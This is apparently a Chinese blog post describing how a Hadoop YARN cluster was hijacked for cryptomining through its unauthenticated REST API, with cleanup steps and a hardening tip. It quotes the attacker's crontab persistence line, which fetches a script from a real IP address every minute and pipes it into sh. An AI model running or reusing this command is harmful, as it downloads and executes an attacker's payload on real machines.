---
layout: post
categories: hadoop yarn hack
title: yarn运莫名其妙的job 导致集群变慢 一直在跑一个用户为dr.who的application
date: 2018-06-21 17:48:51 +0800
description: hadoop mapreduce 任务 莫名其妙的变多了 yarn被黑问题。
keywords: hadoop
---


简单介绍一下过程，现在有些人通过 hadoop 开放的restApi进行挖矿，8088 以及 8090 端口。



### 排问题
  * 1. 集群检查

    今天检查Hadoop 服务器发现Yarn上面的job莫名其妙的变多了，而且一直再跑。
    ![](http://112firshme11224.test.upcdn.net/demos/7422da30-8014-41f6-a922-55f86a3ce252.png)
    经过排查在`/tmp/ /var/tmp` 下面发现了 Java 还有tmp.txt
    内容如下：
    ![](http://112firshme11224.test.upcdn.net/demos/63c45ec8-bcbd-4fbd-98bb-ee624eb4ea70.png)

    服务器地址:`transfer.sh`

  * 2. 检查 `crontab -l ` 发现了一个莫名其妙的 job
    ```bash
    * * * * * wget -q -O - http://185.222.210.59/cr.sh | sh > /dev/null 2>&1
    ```


### 解决办法

   * 1，通过查看占用cpu高得进程，kill掉此进程

   * 2，检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件

   * 3 ，通过crontab -l 查看有一个* * * * * wget -q -O - http://185.222.210.59/cr.sh | sh > /dev/null 2>&1任务，删除此任务

   * 4，排查YARN日志，确认异常的application，删除处理

   * 5 再通过top验证看是否还有高cpu进程，如果有，kill掉，没有的话应该正常了。

   * 6 注意：YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的，因此注意并启用Kerberos认证功能，禁止匿名访问修改8088端口





#### 感谢老铁登科

转载请注明出处，本文采用 [CC4.0](http://creativecommons.org/licenses/by-nc-nd/4.0/) 协议授权
